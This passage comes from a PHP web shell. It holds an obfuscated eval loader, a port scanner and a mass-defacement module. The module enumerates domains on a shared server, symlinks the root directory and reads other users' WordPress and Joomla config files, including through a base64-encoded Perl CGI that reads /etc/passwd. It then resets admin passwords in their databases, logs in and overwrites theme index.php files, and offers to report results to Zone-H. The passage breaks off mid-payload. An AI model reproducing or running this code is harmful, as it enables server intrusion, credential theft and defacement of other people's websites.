    {eval(str_rot13(gzinflate(str_rot13(base64_decode(("tUl7YtpVEP87VXyHiZMr0BLsPJqqgJ14QyBquuNrXEUlEExeeL2E5hZ7wS5pmu9+s7ZWgDM5RCmWJXt0f7Pz3JnJ52lphOsTQ+odbjFOjaGl1CCfWIlGTyPgLguIpQ+VoQKRYD7x8N8mDhsqC/iZRJ9DoxtDqNYDyx4xYA+20BUmvjEF7mw4wlL9WZ8J5o69b6lpcyhg8Qipju+aXkAVo35z+/az5KVGhoozmlEBilhLltbJyVCl6WULvpDx7kNE11lDpQ14NJsKY9hQKEyligc8DHNJFU8xcrXUKgRGV6hWhVooC6xMRCshRH2fz31OLQCfKtyQGVyNpOOg+DflE+hSPAhY+VyXsxRlZ6p3x+qRaWsK2sfqx3B13OZmN4E1QrZ9xuyqqkG5KyaEzCsuidTJdfbJEWEGzOYOE5PAim4j1fEJ/eSOSz7XHm5cqFE2n3bv1XwO4jeYFvfNxmyzNSgkrivclR7zuenIilALjFRpEM65SNzHY2A0nGubQ8Fdv+igZpH2sgfcAblAO6Vpj8lUPkUQYezqhVcB3r2DxaJFKL2AlvDykRjQbmRtpXt90eu0zi/+MJu9U/uijb8VuUxbclBEsBs45k+zkpS3K6iYBVLFaBylnOgI0hRL5Y3FQXRZfmiYBqEwMTNal2AkLeYk59Uya4KEVgfxLZhvd2PP9Djjmxm+i3WCbKyD0jm/ely2bV0lC8ZrMI/PSC4dTjskikOPWSQKiiRBlYk2KBQLancWQQZPKjtVNbgbxDLisK9w5ZNcjAFea4uBWE9P9T1a6/e7mtFxb8YtIi+SxYw7S8EcHX4+7R8bVxyhipKCcTHI0urpvyS8ijMz4sz1Wh6GxcLeoH3wp2nwmR/8RjF/+WNj9+FKVsElEitlvUooy9iV913ikmym133XiZ2pQbgjQUJZQrjEE5mO2peRjLGrIc0EvygbVDwqA/c8J+SOLzB2Q6kSJp0MzIZnS+ZUHcuQxS8P5vT/2KW2meKRHbey2DEnkutEuHe1GtDBZRMI6HD2F8rxaCjBjx+QTxpKDfidRgsLX/VsOyt7Mm/6IohStil49uKEetKv3+73D0KMWDsk3BP0jfIvrUvo8YG21e3o94+7mnP8FXTYGyqXptOW2vVBNe2kdNwiZh+r/Ns6D/N6WPV+vrTAT8slKBWe8WvLrREPoeMLav70RqakveP7ZuvYcdErllZIvvJ77rg0sNlJhj1PnYNCxUdCm/1rPK6MLByKKpbARIhG7ES6OQm5NTdvM7826yo34HbLiMVo85WApX0fXpBkw5+LB9CNtD7hkLPex0rFQBHbKs5S5j2nxQVCGfrXN63ehflb++a622H1zN56+/qm9OpMGzw9o09LDyIMydh1CsuTqb6lvxOKR6yiefbiK97cQF4lre4/idARGdaujmDr5XvpxPQXP/guZC3mu3GcxgGvFiMWRjD2jvXBa3biz+dp/gU="))))));}   
elseif($_GET['do'] == 'metu') {
    

echo '<form action="?dir=$dir&do=metu" method="post">';
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
    echo 'Byee !';
    
}
elseif ($_GET['do'] == 'port') {
        echo '<div style="text-align:left" class="mybox"><table><tr><h1>Port Scanner</h1><hr color="white"><td>';
        echo '<div class="content">';
        echo '<form action="" method="post">';
        if (isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])) {
            $start = strip_tags($_POST['start']);
            $end = strip_tags($_POST['end']);
            $host = strip_tags($_POST['host']);
            for ($i = $start;$i <= $end;$i++) {
                $fp = @fsockopen($host, $i, $errno, $errstr, 3);
                if ($fp) {
                    echo 'Port ' . $i . ' is <font color=green>open</font><br>';
                }
                flush();
            }
        } else {
            echo '<input type="hidden" name="a" value="PortScanner"><input type="hidden" name=p1><input type="hidden" name="p2">
              <input type="hidden" name="c" value="' . htmlspecialchars($GLOBALS['cwd']) . '">
              <input type="hidden" name="charset" value="' . (isset($_POST['charset']) ? $_POST['charset'] : '') . '">
              Host: &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<input type="text" style="border:0;border-bottom:1px solid #292929; width:500px;" name="host" value="localhost"/><br /><br />
              Port Start: &nbsp<input type="text" style="border:0;border-bottom:1px solid #292929; width:500px;" name="start" value="0"/><br /><br />
              Port End:&nbsp&nbsp&nbsp&nbsp<input type="text" style="border:0;border-bottom:1px solid #292929; width:500px;" name="end" value="5000"/><br /><br />
              <input type="submit" style="width: 100px; height: 30px; border-color=white;margin:10px 2px 0 2px;" value="Scan Ports !" />
              </form>';
            echo '</div></table></td></div>';
        }

}
elseif($_GET['do'] == 'ngindexx') {
    {error_reporting(0);function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){$ar0=explode($marqueurDebutLien, $text);$ar1=explode($marqueurFinLien, $ar0[$i]);return trim($ar1[0]);}function randomt() {$chars = "abcdefghijkmnopqrstuvwxyz023456789";srand((double)microtime()*1000000);$i = 0;$pass = '';while ($i <= 7) {$num = rand() % 33;$tmp = substr($chars, $num, 1);$pass = $pass . $tmp;$i++;}return $pass;}function index_changer_wp($conf, $content) {$output = '';$dol = '$';$go = 0;$username = entre2v2($conf,"define('DB_USER', '","');");$password = entre2v2($conf,"define('DB_PASSWORD', '","');");$dbname = entre2v2($conf,"define('DB_NAME', '","');");$prefix = entre2v2($conf,$dol."table_prefix  = '","'");$host = entre2v2($conf,"define('DB_HOST', '","');");$link=mysql_connect($host,$username,$password);if($link) {mysql_select_db($dbname,$link) ;$dol = '$';$req1 = mysql_query("UPDATE `".$prefix."users` SET `user_login` = 'admin',`user_pass` = '4297f44b13955235245b2497399d7a93' WHERE `ID` = 1");} else {$output.= "[-] DB Error<br />";}if($req1) {$req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='home'");$data = mysql_fetch_array($req);$site_url=$data["option_value"]; $req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='template'");$data = mysql_fetch_array($req);$template = $data["option_value"];$req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='current_theme'");$data = mysql_fetch_array($req);$current_theme = $data["option_value"];$useragent="Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)";$url2=$site_url."/wp-login.php";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"log=admin&pwd=123123&rememberme=forever&wp-submit=Log In&testcookie=1");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer = curl_exec($ch);$pos = strpos($buffer,"action=logout");if($pos === false) {$output.= "[-] Login Error<br />";} else {$output.= "[+] Login Successful<br />";$go = 1;}if($go) {$cond = 0;$url2=$site_url."/wp-admin/theme-editor.php?file=/themes/".$template.'/index.php&theme='.urlencode($current_theme).'&dir=theme';curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer0 = curl_exec($ch);$_wpnonce = entre2v2($buffer0,'<input type="hidden" id="_wpnonce" name="_wpnonce" value="','" />');$_file = entre2v2($buffer0,'<input type="hidden" name="file" value="','" />');if(substr_count($_file,"/index.php") != 0){$output.= "[+] index.php loaded in Theme Editor<br />";$url2=$site_url."/wp-admin/theme-editor.php";curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"newcontent=".base64_decode($content)."&action=update&file=".$_file."&_wpnonce=".$_wpnonce."&submit=Update File");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buffer,'<div id="message" class="updated">');if($pos === false) {$output.= "[-] Updating Index.php Error<br />";} else {$output.= "[+] Index.php Updated Successfuly<br />";$hk = explode('public_html',$_file);$output.= '[+] Deface '.file_get_contents($site_url.str_replace('/blog','',$hk[1]));$cond = 1;}} else {$url2=$site_url.'/wp-admin/theme-editor.php?file=index.php&theme='.$template;curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer0 = curl_exec($ch);$_wpnonce = entre2v2($buffer0,'<input type="hidden" id="_wpnonce" name="_wpnonce" value="','" />');$_file = entre2v2($buffer0,'<input type="hidden" name="file" value="','" />');if(substr_count($_file,"index.php") != 0){$output.= "[+] index.php loaded in Theme Editor<br />";$url2=$site_url."/wp-admin/theme-editor.php";curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"newcontent=".base64_decode($content)."&action=update&file=".$_file."&theme=".$template."&_wpnonce=".$_wpnonce."&submit=Update File");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buffer,'<div id="message" class="updated">');if($pos === false) {$output.= "[-] Updating Index.php Error<br />";} else {$output.= "[+] Index.php Template Updated Successfuly<br />";$output.= '[+] Deface '.file_get_contents($site_url.'/wp-content/themes/'.$template.'/index.php');$cond = 1;}} else {$output.= "[-] index.php can not load in Theme Editor<br />";}}}} else {$output.= "[-] DB Error<br />";}global $base_path;unlink($base_path.'COOKIE.txt');return array('cond'=>$cond, 'output'=>$output);}function index_changer_joomla($conf, $content, $domain) {$doler = '$';$username = entre2v2($conf, $doler."user = '", "';");$password = entre2v2($conf, $doler."password = '", "';");$dbname = entre2v2($conf, $doler."db = '", "';");$prefix = entre2v2($conf, $doler."dbprefix = '", "';");$host = entre2v2($conf, $doler."host = '","';");$co=randomt();$site_url = "http://".$domain."/administrator";$output = '';$cond = 0; $link=mysql_connect($host, $username, $password);if($link) {mysql_select_db($dbname,$link) ;$req1 = mysql_query("UPDATE `".$prefix."users` SET `username` ='admin' , `password` = '4297f44b13955235245b2497399d7a93', `usertype` = 'Super Administrator', `block` = 0");$req = mysql_numrows(mysql_query("SHOW TABLES LIKE '".$prefix."extensions'"));} else {$output.= "[-] DB Error<br />";}if($req1){if ($req) {$req = mysql_query("SELECT * from  `".$prefix."template_styles` WHERE `client_id` = '0' and `home` = '1'");$data = mysql_fetch_array($req);$template_name = $data["template"];$req = mysql_query("SELECT * from  `".$prefix."extensions` WHERE `name`='".$template_name."' or `element` = '".$template_name."'");$data = mysql_fetch_array($req);$template_id = $data["extension_id"];$url2=$site_url."/index.php";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$return = entre2v2($buffer ,'<input type="hidden" name="return" value="','"');$hidden = entre2v2($buffer ,'<input type="hidden" name="','" value="1"',4);if($return && $hidden) {curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_REFERER, $url2);curl_setopt($ch, CURLOPT_POSTFIELDS, "username=admin&passwd=123123&option=com_login&task=login&return=".$return."&".$hidden."=1");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$pos = strpos($buffer,"com_config");if($pos === false) {$output.= "[-] Login Error<br />";} else {$output.= "[+] Login Successful<br />";}}if($pos){$url2=$site_url."/index.php?option=com_templates&task=source.edit&id=".base64_encode($template_id.":index.php");$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',2);if($hidden2) {$output.= "[+] index.php file found in Theme Editor<br />";} else {$output.= "[-] index.php Not found in Theme Editor<br />";}}if($hidden2) {$url2=$site_url."/index.php?option=com_templates&layout=edit";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"jform[source]=".$content."&jform[filename]=index.php&jform[extension_id]=".$template_id."&".$hidden2."=1&task=source.save");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buffer,'<dd class="message message">');$cond = 0;if($pos === false) {$output.= "[-] Updating Index.php Error<br />";} else {$output.= "[+] Index.php Template successfully saved<br />";$cond = 1;}}} else {$req =mysql_query("SELECT * from  `".$prefix."templates_menu` WHERE client_id='0'");$data = mysql_fetch_array($req);$template_name=$data["template"];$useragent="Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)";$url2=$site_url."/index.php";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',3);if($hidden) {curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456&option=com_login&task=login&".$hidden."=1");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$pos = strpos($buffer,"com_config");if($pos === false) {$output.= "[-] Login Error<br />";} else {$output.= "[+] Login Successful<br />";}}if($pos) {$url2=$site_url."/index.php?option=com_templates&task=edit_source&client=0&id=".$template_name;curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',6);if($hidden2) {$output.= "[+] index.php file founded in Theme Editor<br />";} else {$output.= "[-] index.php Not found in Theme Editor<br />";}}if($hidden2) {$url2=$site_url."/index.php?option=com_templates&layout=edit";curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"filecontent=".$content."&id=".$template_name."&cid[]=".$template_name."&".$hidden2."=1&task=save_source&client=0");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co);$buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buffer,'<dd class="message message fade">');$cond = 0;if($pos === false) {$output.= "[-] Updating Index.php Error<br />";} else {$output.= "[+] Index.php Template successfully saved<br />";$cond = 1;}}}} else {$output.= "[-] DB Error<br />";}global $base_path;unlink($base_path.$co);return array('cond'=>$cond, 'output'=>$output); }function exec_mode_1($def_url) {@mkdir('sym',0777);$wr  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";$fp = @fopen ('sym/.htaccess','w');fwrite($fp, $wr);@symlink('/','sym/root');$dominios = @file_get_contents("/etc/named.conf");@preg_match_all('/.*?zone "(.*?)" {/', $dominios, $out);$out[1] = array_unique($out[1]);$numero_dominios = count($out[1]);echo "Total domains: $numero_dominios <br><br />";$def = file_get_contents($def_url);$def = urlencode($def);$dd = 'PD9waHANCiRkZWYgPSBmaWxlX2dldF9jb250ZW50cygnaHR0cDovL3pvbmVobWlycm9ycy5vcmcvZGVmYWNlZC8yMDEzLzAzLzE5L2Fzc29jaWFwcmVzcy5uZXQnKTsNCiRwID0gZXhwbG9kZSgncHVibGljX2h0bWwnLGRpcm5hbWUoX19GSUxFX18pKTsNCiRwID0gJHBbMF0uJ3B1YmxpY19odG1sJzsNCmlmICgkaGFuZGxlID0gb3BlbmRpcigkcCkpIHsNCiAgICAkZnAxID0gQGZvcGVuKCRwLicvaW5kZXguaHRtbCcsJ3crJyk7DQogICAgQGZ3cml0ZSgkZnAxLCAkZGVmKTsNCiAgICAkZnAxID0gQGZvcGVuKCRwLicvaW5kZXgucGhwJywndysnKTsNCiAgICBAZndyaXRlKCRmcDEsICRkZWYpOw0KICAgICRmcDEgPSBAZm9wZW4oJHAuJy9pbmRleC5odG0nLCd3KycpOw0KICAgIEBmd3JpdGUoJGZwMSwgJGRlZik7DQogICAgZWNobyAnRG9uZSc7DQp9DQpjbG9zZWRpcigkaGFuZGxlKTsNCnVubGluayhfX0ZJTEVfXyk7DQo/Pg==';$base_url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/sym/root/home/';$output = fopen('defaced.html', 'a+');$_SESSION['count1'] = (isset($_GET['st']) && $_GET['st']!='') ? (isset($_SESSION['count1']) ? $_SESSION['count1'] :0 ) : 0;$_SESSION['count2'] = (isset($_GET['st']) && $_GET['st']!='') ? (isset($_SESSION['count2']) ? $_SESSION['count2'] :0 ) : 0;echo '<table style="width:75%;" align="center"><tr style="background:rgba(160, 82, 45,0.6);"><th>ID</th><th>SID</th><th>Domain</th><th>Type</th><th>Action</th><th>Status</th></tr>';$j = 1;$st = (isset($_GET['st']) && $_GET['st']!='') ? $_GET['st'] : 0;for($i = $st; $i <= $numero_dominios; $i++){$domain = $out[1][$i];$dono_arquivo = @fileowner("/etc/valiases/".$domain);$infos = @posix_getpwuid($dono_arquivo);if($infos['name']!='root') {$config01 = @file_get_contents($base_url.$infos['name']."/public_html/configuration.php");$config02 = @file_get_contents($base_url.$infos['name']."/public_html/wp-config.php");$config03 = @file_get_contents($base_url.$infos['name']."/public_html/blog/wp-config.php");$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';if($config01 && preg_match('/dbprefix/i',$config01)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="pink">JOOMLA</font></td>';$res = index_changer_joomla($config01, $def, $domain);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$_SESSION['count1'] = $_SESSION['count1'] + 1;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}if($config02 && preg_match('/DB_NAME/i',$config02)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="#FDF105">WORDPRESS</font></td>';$res = index_changer_wp($config02, $dd);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$_SESSION['count2'] = $_SESSION['count2'] + 1;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';if($config03 && preg_match('/DB_NAME/i',$config03)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="#FDF105">WORDPRESS</font></td>';$res = index_changer_wp($config03, $dd);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$_SESSION['count2'] = $_SESSION['count2'] + 1;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}}}echo '</table>';echo '<hr/>';echo 'Total Defaced = '.($_SESSION['count1']+$_SESSION['count2']).' (JOOMLA = '.$_SESSION['count1'].', WORDPRESS = '.$_SESSION['count2'].')<br />';echo '<a href="defaced.html" target="_blank">View Total Defaced urls</a><br />';if($_SESSION['count1']+$_SESSION['count2'] > 0){echo '<a href="'.$_SERVER['PHP_SELF'].'?pass='.$_GET['pass'].'&zh=1" target="_blank" id="zhso">Send to Zone-H</a>';}}function exec_mode_2($def_url) {$domains = @file_get_contents("/etc/named.conf");@preg_match_all('/.*?zone "(.*?)" {/', $domains, $out);$out = array_unique($out[1]);$num = count($out);print("Total domains: $num<br><br />");$def = file_get_contents($def_url);$def = urlencode($def);$output = fopen('defaced.html', 'a+');$defaced = '';$count1 = 0;$count2 = 0;echo '<table style="width:75%;"><tr style="background:rgba(160, 82, 45,0.6);"><th>ID</th><th>SID</th><th>Domain</th><th>Type</th><th>Action</th><th>Status</th></tr>';$j = 1;$map = array();foreach($out as $d) {$info = @posix_getpwuid(fileowner("/etc/valiases/".$d));$map[$info['name']] = $d;}$dt = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpzdWIgbGlsew0KICAgICgkdXNlcikgPSBAXzsNCiAgICAkbXNyID0gcXh7cHdkfTs
   NCiAgICAka29sYT0kbXNyLiIvIi4kdXNlcjsNCiAgICAka29sYT1+cy9cbi8vZzsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2
   h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicjI2pvb21sYS50eHQnKTsgDQogICAgc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19od
   G1sL3dwLWNvbmZpZy5waHAnLCRrb2xhLicjI3dvcmRwcmVzcy50eHQnKTsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwv
   YmxvZy93cC1jb25maWcucGhwJywka29sYS4nIyNzd29yZHByZXNzLnR4dCcpOw0KfQ0KDQpsb2NhbCAkLzsNCm9wZW4oRklMRSwgJy9ldGMvcGFzc3d
   kJyk7ICANCkBsaW5lcyA9IDxGSUxFPjsgDQpjbG9zZShGSUxFKTsNCiR5ID0gQGxpbmVzOw0KDQpmb3IoJGthPTA7JGthPCR5OyRrYSsrKXsNCiAgIC
   B3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiAgICAgICAgJmxpbCgkMSk7DQogICAgfQ0KfQ==';mkdir('plsym',0777);file_put_contents('plsym/plsym.cc', base64_decode($dt));chmod('plsym/plsym.cc', 0755);$wr  = "Options FollowSymLinks MultiViews Indexes ExecCGI\n\nAddType application/x-httpd-cgi .cc\n\nAddHandler cgi-script .cc\nAddHandler cgi-script .cc";$fp = @fopen ('plsym/.htaccess','w');fwrite($fp, $wr);fclose($fp);$res = file_get_contents('http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/plsym/plsym.cc');  $url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/plsym/';unlink('plsym/plsym.cc');$data = file_get_contents($url);preg_match_all('/<a href="(.+)">/', $data, $match);unset($match[1][0]);$i = 1;foreach($match[1] as $m){$mz = explode('##',urldecode($m));$config01 = '';$config02 = '';if($mz[1] == 'joomla.txt') {$config01 = file_get_contents($url.$m);}if($mz[1] == 'wordpress.txt') {$config02 = file_get_contents($url.$m);}$domain = $map[$mz[0]];$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';if($config01 && preg_match('/dbprefix/i',$config01)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i++.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="pink">JOOMLA</font></td>';$res = index_changer_joomla($config01, $def, $domain);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$count1++;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}if($config02 && preg_match('/DB_NAME/i',$config02)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="#FDF105">WORDPRESS</font></td>';$res = index_changer_wp($config02, $def);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$count2++;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}}echo '</table>';echo '<hr/>';echo 'Total Defaced = '.($count1+$count2).' (JOOMLA = '.$count1.', WORDPRESS = '.$count2.')<br />';echo '<a href="defaced.html" target="_blank">View Total Defaced urls</a><br />';if($count1+$count2 > 0){echo '<a href="'.$_SERVER['PHP_SELF'].'?pass='.$_GET['pass'].'&zh=1" target="_blank" id="zhso">Send to Zone-H</a>';}}function exec_mode_3($def_url) {$domains = @file_get_contents("/etc/named.conf");@preg_match_all('/.*?zone "(.*?)" {/', $domains, $out);$out = array_unique($out[1]);$num = count($out);print("Total domains: $num<br><br />");$def = file_get_contents($def_url);$def = urlencode($def);  $output = fopen('defaced.html', 'a+');$defaced = '';$count1 = 0;$count2 = 0;echo '<table style="width:75%;"><tr style="background:rgba(160, 82, 45,0.6);"><th>ID</th><th>SID</th><th>Domain</th><th>Type</th><th>Action</th><th>Status</th></tr>';$j = 1;$map = array();foreach($out as $d) {$info = @posix_getpwuid(fileowner("/etc/valiases/".$d));$map[$info['name']] = $d;}$dt = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpzdWIgbGlsew0KICAgICgkdXNlcikgPSBAXzsNCiAgICAkbXNyID0gcXh7cHd
   kfTsNCiAgICAka29sYT0kbXNyLiIvIi4kdXNlcjsNCiAgICAka29sYT1+cy9cbi8vZzsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcH
   VibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicjI2pvb21sYS50eHQnKTsgDQogICAgc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL
   3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRrb2xhLicjI3dvcmRwcmVzcy50eHQnKTsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicv
